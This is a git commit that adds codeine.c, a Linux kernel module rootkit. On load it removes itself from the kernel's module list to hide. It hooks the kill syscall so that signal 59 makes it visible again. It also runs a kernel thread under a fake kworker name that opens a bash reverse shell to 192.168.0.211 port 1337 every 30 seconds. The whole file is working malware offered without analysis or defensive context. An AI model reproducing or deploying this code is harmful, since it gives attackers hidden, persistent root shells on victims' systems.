9966803bd126a0b45a94ea8e88fb86e18b368ee5
Diego Tellaroli <diegotellaroli05@gmail.com>
2024-12-19 20:55:54 -0300

    Create codeine.c

---
+++ codeine.c
@@ -0,0 +1,100 @@
+//para fazer: esconder /etc/modules
+
+#include <linux/init.h>         // Module initialization functions
+#include <linux/module.h>       // Kernel module functions.
+#include <linux/kernel.h>       // Basic kernel definitions, such as printk.
+#include <linux/kthread.h>      // Thread management in the kernel.
+#include <linux/delay.h>        // Delay functions, such as ssleep().
+#include <linux/sched/signal.h> // Process management in the kernel.
+#include <linux/string.h>       // For string functions like strlen() and strncmp().
+
+#include "ftrace_helper.h"
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("GPL");
+MODULE_DESCRIPTION("GPL");
+
+
+static asmlinkage long(*orig_kill)(const struct pt_regs *);
+
+static struct list_head *module_previous;
+void module_hide(void)
+{
+        module_previous = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+
+}
+
+void module_show(void)
+{
+ list_add(&THIS_MODULE->list, module_previous);
+}
+
+
+static asmlinkage int hook_kill(const struct pt_regs *regs){
+ void module_show(void);
+
+ int signal;
+ signal = regs->si;
+
+ if(signal == 59){
+  module_show();
+  return 0;
+ }
+
+ return orig_kill(regs);
+}
+
+static struct ftrace_hook hooks[] = {
+                HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+};
+
+struct task_struct *mon_thread; // Reference for the monitoring thread.
+struct task_struct *task; // Structure used to represent tasks (processes) in the kernel.
+
+int mon_shell(void *data) {     // Function that will be executed by the kernel thread (mon_thread).
+    while (!kthread_should_stop()) {  // Checks if the thread should stop.
+
+            call_usermodehelper("/bin/bash",
+                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.0.211/1337 0>&1", NULL},
+                                NULL, UMH_WAIT_EXEC);
+
+
+        ssleep(30);  // Waits 5 seconds before trying again.
+    }
+    return 0;  // Returns 0 when the thread finishes.
+}
+
+static int __init uninterruptible_sleep_init(void) {
+    module_hide();
+    // Creates and runs the monitoring thread mon_shell.
+    mon_thread = kthread_run(mon_shell, NULL, "kworker/R-644-sci"); //random name that will appear in ps
+
+    // Checks if the thread creation failed.
+    if (IS_ERR(mon_thread)) {
+        printk(KERN_ALERT "Failed to create thread!\n");
+        return PTR_ERR(mon_thread);  // Returns the error.
+    }
+
+    int error;
+    error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(error){
+           return error;
+    }
+
+
+    printk(KERN_INFO "Monitoring started!\n");
+    return 0;  // Returns 0 if the thread was successfully created.
+}
+
+static void __exit uninterruptible_sleep_exit(void) {
+    if (mon_thread) {
+        kthread_stop(mon_thread);  // Stops the monitoring thread.
+    }
+
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+
+}
+
+module_init(uninterruptible_sleep_init);
+module_exit(uninterruptible_sleep_exit);
